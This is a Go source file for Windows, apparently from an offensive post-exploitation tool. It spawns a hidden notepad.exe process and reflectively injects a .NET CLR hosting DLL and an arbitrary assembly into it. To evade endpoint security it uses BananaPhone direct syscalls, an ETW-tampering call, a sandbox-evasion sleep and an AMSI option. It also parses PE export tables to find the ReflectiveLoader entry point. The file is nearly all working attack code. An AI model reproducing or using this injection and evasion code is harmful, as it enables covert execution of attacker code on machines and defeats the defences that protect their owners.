// +build windows

package assembly

import (
	//"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
	"log"
	//"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (

	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT          = 0x001000
	MEM_RESERVE         = 0x002000
	STILL_RUNNING		= 259
	EXPORTED_FUNCTION_NAME = "ReflectiveLoader"
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
	//procCreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
)
/*
func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, stackSize uint32, startAddress, parameter uintptr, creationFlags uint32) (syscall.Handle, uint32, error) {
	var threadID uint32
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadID)))
	runtime.KeepAlive(sa)
	if int(r1) == 0 {
		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
	}
	return syscall.Handle(r1), threadID, nil
}
 */



func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
	var exitCode uint32
	r1, _, e1 := procGetExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return exitCode, e1
	}
	return exitCode, nil
}

// ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
// along with a provided .NET assembly to execute.
func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi bool) error {

	//Declare BananaPhone
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	a11oc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	write, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	create, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}
	var(
		baseAddress   uintptr
		baseAddress1   uintptr
	)


	AssemblySizeArr := convertIntToByteArr(len(assembly))

	ParamsSizeArr := convertIntToByteArr(len(params)+1)// +1 accounts for the trailing null


	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	cmd.Start()
	pid := cmd.Process.Pid

	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	//hostingDllAddr, err := virtualAllocEx(handle,  uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	//if err != nil {
	//	return err
	//}
	etw(uintptr(handle))


	fmt.Println("Dynamic Evasion")
	fmt.Println("Please Wait for 10 seconds......")
	time.Sleep(10*time.Second)



	//1
	var allocatedSize = uint64(len(hostingDll))
	//NtAllocateVirtualMemory
	r1, r := bananaphone.Syscall(
		a11oc, //NtAllocateVirtualMemory
		uintptr(handle),
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&allocatedSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	fmt.Println(baseAddress)
	if r != nil {
		fmt.Printf("2 %s %x\n", r, r1)
		return nil
	}
	fmt.Printf("BananaPhone: Allocated %dbytes at 0x%X\n", allocatedSize, baseAddress)







	// WriteProcessMemory to write the reflective loader into the process
	//_, err = writeProcessMemory(handle, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
	//if err != nil {
	//	return err
	//}
	//log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)

	//2
	//NtWriteVirtualMemory
	r1, r = bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(handle),
		uintptr(baseAddress),
		uintptr(unsafe.Pointer(&hostingDll[0])),
		uintptr(allocatedSize),
		0,
	)
	if r != nil {
		fmt.Printf("3 %s %x\n", r, r1)
		return nil
	}

	fmt.Printf("BananaPhone: Wrote %dbytes at 0x%X\n", allocatedSize, baseAddress)






	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	//assemblyAddr, err := virtualAllocEx(handle, uint32(len(assembly)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	//if err != nil {
	//	return err
	//}



	//3
	var assmblySize = uint64(len(assembly))
	//NtAllocateVirtualMemory
	r1, r = bananaphone.Syscall(
		a11oc, //NtAllocateVirtualMemory
		uintptr(handle),
		uintptr(unsafe.Pointer(&baseAddress1)),
		0,
		uintptr(unsafe.Pointer(&assmblySize)),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	fmt.Println(baseAddress1)
	if r != nil {
		fmt.Printf("2 %s %x\n", r, r1)
		return nil
	}
	fmt.Printf("BananaPhone: Allocated %dbytes at 0x%X\n", assmblySize, baseAddress1)














	// 4 bytes Assembly Size
	// 4 bytes Params Size
	// 1 byte AMSI bool  0x00 no  0x01 yes
	// parameter bytes
	// assembly bytes
	payload := append(AssemblySizeArr, ParamsSizeArr...)
	if amsi {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}

	payload = append(payload,  []byte(params)...)
	payload = append(payload,  '\x00')

	payload = append(payload, assembly...)

	// WriteProcessMemory to write the .NET assembly + args
	//_, err = writeProcessMemory(handle,  unsafe.Pointer(&payload[0]), uint32(len(payload)))
	//if err != nil {
	//	return err
	//}
	//log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)



	//4

	var plSize = uint64(len(payload))
	//NtWriteVirtualMemory
	r1, r = bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(handle),
		uintptr(baseAddress1),
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(plSize),
		0,
	)
	if r != nil {
		fmt.Printf("3 %s %x\n", r, r1)
		return nil
	}

	fmt.Printf("BananaPhone: Wrote %dbytes at 0x%X\n", plSize, baseAddress1)











	// CreateRemoteThread(DLL addr + offset, assembly addr)
	//attr := new(syscall.SecurityAttributes)

	functionOffset, err := findRawFileOffset(hostingDll, EXPORTED_FUNCTION_NAME)

	//threadHandle, _, err := createRemoteThread(create,handle, attr, 0, uintptr(baseAddress + uintptr(functionOffset)), uintptr(baseAddress1), 0)
	//if err != nil {
	//	return err
	//}
	//log.Println("Got thread handle:", threadHandle)


	var threadHandle1 uintptr
	//NtCreateThreadEx
	_, r = bananaphone.Syscall(
		create,											//NtCreateThreadEx
		uintptr(unsafe.Pointer(&threadHandle1)),			//hthread
		windows.GENERIC_EXECUTE,						//desiredaccess
		0,									//objattributes
		uintptr(handle),							//processhandle
		uintptr(baseAddress + uintptr(functionOffset)),									//lpstartaddress
		uintptr(baseAddress1),												//lpparam
		0,												//createsuspended
		0,												//zerobits
		0,												//sizeofstackcommit
		0,												//sizeofstackreserve
		0,				//lpbytesbuffer
	)
	//runtime.KeepAlive(attr)
	threadHandle := syscall.Handle(threadHandle1)
	if r != nil {
		return r
	}
	log.Println("Got thread handle:", threadHandle)


	//fmt.Printf("Press any key to continue...")
	//bufio.NewReader(os.Stdin).ReadBytes('\n')



	for {
		code, err := getExitCodeThread(threadHandle)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Fatalln(err.Error())
		}
		if code == STILL_RUNNING {
			time.Sleep(1000 * time.Millisecond)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
	return nil
}

func convertIntToByteArr(num int) (arr []byte) {
	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
	arr = append(arr, byte(num%256))
	v := num / 256
	arr = append(arr, byte(v%256))
	v = v / 256
	arr = append(arr, byte(v%256))
	v = v / 256
	arr = append(arr, byte(v))

	return
}


func findRawFileOffset(pSourceBytes []byte, exportedFunctionName string) (rawOffset DWORD, err error){

	var pImageHeader IMAGE_DOS_HEADER
	var pOldNtHeader IMAGE_NT_HEADERS
	var pOldOptHeader IMAGE_OPTIONAL_HEADER
	var pOldFileHeader IMAGE_FILE_HEADER

	// we will re read portions of the byte array into data structs
	// Set back to start
	rdrBytes := bytes.NewReader(pSourceBytes)
	err = binary.Read(rdrBytes, binary.LittleEndian, &pImageHeader)
	if err != nil {
		log.Printf("Failure Reading dll in binary mode, for pImageHeader : %s\n", err)
	}

	// Check the Magic Byte
	if pImageHeader.E_magic != 0x5A4D {
		err = errors.New("Invalid File Format")
		return
	}

	// Just Read the NTHeader from the DLL and cast it pOldNtHeader
	ntHeaderOffset := pImageHeader.E_lfanew
	const sizeOfNTHeader = unsafe.Sizeof(pOldNtHeader)

	// Set the position at the ntHeaderOffset
	rdrBytes = bytes.NewReader(pSourceBytes[ntHeaderOffset:])
	err = binary.Read(rdrBytes, binary.LittleEndian, &pOldNtHeader)
	if err != nil {
		log.Printf("Failure Reading dll in binary mode, for pOldNtHeader : %s\n", err)
		return
	}

	// populate the Optional Header
	pOldOptHeader = pOldNtHeader.OptionalHeader
	pOldFileHeader = pOldNtHeader.FileHeader

	// Where is the export table?
	var exportTableAddress DWORD
	exportTableAddress = pOldOptHeader.DataDirectory[0].VirtualAddress

	var sectionHeaderOffset uint16
	sectionHeaderOffset = IMAGE_FIRST_SECTION(pImageHeader.E_lfanew, pOldNtHeader)
	var sectionHeader IMAGE_SECTION_HEADER
	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)
	var i WORD

	// look for the exports
	section := 0
	var sectionName  [8]BYTE
	var pointerToCodeRawData DWORD
	var virtualOffsetForCode DWORD
	for i = 0; i != pOldFileHeader.NumberOfSections; i++ {
		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
		if err != nil {
			log.Printf("Failure Reading dll in binary mode, for sectionHeader : %s", err.Error())
			return
		}

		// We need to find the .text section to capture the code offset and virtual address
		var secName []byte
		for _, b := range sectionHeader.Name{
			if b == 0 {
				break
			}
			secName = append(secName, byte(b))
		}
		if bytes.Contains(secName, []byte(".text")){
			virtualOffsetForCode =sectionHeader.VirtualAddress
			virtualOffsetForCode =sectionHeader.VirtualAddress
			pointerToCodeRawData=sectionHeader.PointerToRawData
			// This is for finding the DLLMain
		}

		// For Export table
		if sectionHeader.VirtualAddress > exportTableAddress {
			break
		}
		sectionName =  sectionHeader.Name
		section++
		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
	}

	sectionHeaderOffset = IMAGE_FIRST_SECTION(pImageHeader.E_lfanew, pOldNtHeader)
	// process each section
	for i = 0; i != pOldFileHeader.NumberOfSections; i++ {
		// Read in the bytes to make up the sectionHeader
		// Set the position at the ntHeaderOffset

		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
		if err != nil {
			log.Printf("Failure Reading dll in binary mode, for sectionHeader : %s\n", err)
			return
		}

		if sectionHeader.SizeOfRawData > 0 {
			source := make([]byte, sectionHeader.SizeOfRawData)
			// Set the position at the ntHeaderOffset

			rdrBytes = bytes.NewReader(pSourceBytes[sectionHeader.PointerToRawData:])
			err = binary.Read(rdrBytes, binary.LittleEndian, &source)
			if err != nil {
				log.Printf("Failure Reading dll in binary mode, for source : %s\n", err)
				return
			}

			if sectionHeader.Name == sectionName  {

				// Let's get the Data Dictionary for the Export table
				addrOffset := exportTableAddress - sectionHeader.VirtualAddress
				var exportDirectory IMAGE_EXPORT_DIRECTORY
				length := unsafe.Sizeof(exportDirectory)

				offset := sectionHeader.PointerToRawData + DWORD(addrOffset)
				rdrBytes = bytes.NewReader(pSourceBytes[offset:offset+DWORD(length)])
				err = binary.Read(rdrBytes, binary.LittleEndian, &exportDirectory)
				if err != nil {
					log.Printf("Failure Reading dll in binary mode, for fragment : %s\n", err)
					return
				}

				//Let's process the names in order to identify the exported function that we are looking for
				addr := sectionHeader.PointerToRawData + exportDirectory.AddressOfNames - sectionHeader.VirtualAddress
				addrBytes, e :=getAddress(pSourceBytes, DWORD(addr), 4)
				if e != nil {
					err = e
					log.Printf("Failure Reading dll in binary mode, for AddressOfNames : %s\n", err)
					return
				}
				expOffset := 0
				for i := len(addrBytes)-1; i >= 0; i-- {
					expOffset *= 256
					expOffset += int(addrBytes[i])
				}

				// Now let's read the value at the the identified address
				//  To do so we need to find the raw offset in the source bytes
				addr = sectionHeader.PointerToRawData + DWORD( expOffset) - sectionHeader.VirtualAddress
				nameLength := len(exportedFunctionName) + 1

				addrBytes, err =getAddress(pSourceBytes,addr, uint32(nameLength))
				if err != nil {
					log.Printf("Failure Reading dll in binary mode, for AddressOfNames : %s\n", err.Error())
					return
				}
				var name []byte
				for _, b := range addrBytes{
					if b == 0 {
						break
					}
					name = append(name, b)
				}

				if( bytes.Contains(name, []byte("?"+exportedFunctionName))){
					//fmt.Println(" **** FOUND ****")

					// let's get the address for this function
					addr = sectionHeader.PointerToRawData + exportDirectory.AddressOfFunctions -sectionHeader.VirtualAddress
					addrBytes, err =getAddress(pSourceBytes, addr, 4)
					if err != nil {
						log.Printf("Failure Reading dll in binary mode, for AddressOfFunctions : %s\n", err.Error())
						return
					}
					//fmt.Printf("\nexportDirectory.AddressOfFunctions @ %x %x %x\n", exportDirectory.AddressOfFunctions, addrBytes, addrBytes)
					expOffset = 0
					for i := len(addrBytes)-1; i >= 0; i-- {
						expOffset *= 256
						expOffset += int(addrBytes[i])
					}
					// Because we are looking for the position in the file we need to convert the address from in memory
					//  to where it is in the raw file
					rawOffset = pointerToCodeRawData + DWORD(expOffset) - virtualOffsetForCode
					return
				}
			}
		}
		// Increment the section header the size of the the section header
		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)

	}
	return 0, errors.New("Export not found")
}

func getAddress(source []byte, offset  DWORD, length uint32)(result []byte, err error){

	result = make([]byte, length)
	rdrBytes := bytes.NewReader(source[offset:offset+DWORD(length)])
	err = binary.Read(rdrBytes, binary.LittleEndian, &result)
	return
}


func IMAGE_FIRST_SECTION(offset LONG, ntHeader IMAGE_NT_HEADERS) uint16 {

	//We need to find the starting address of the Section Images
	var x IMAGE_NT_HEADERS
	const sizeSignature = unsafe.Sizeof(x.Signature)
	const sizeFileHeader = unsafe.Sizeof(x.FileHeader)
	const sizeOptHeader = unsafe.Sizeof(x.OptionalHeader)

	total := uint16(uintptr(offset) + sizeSignature + sizeFileHeader + sizeOptHeader)

	return total
}
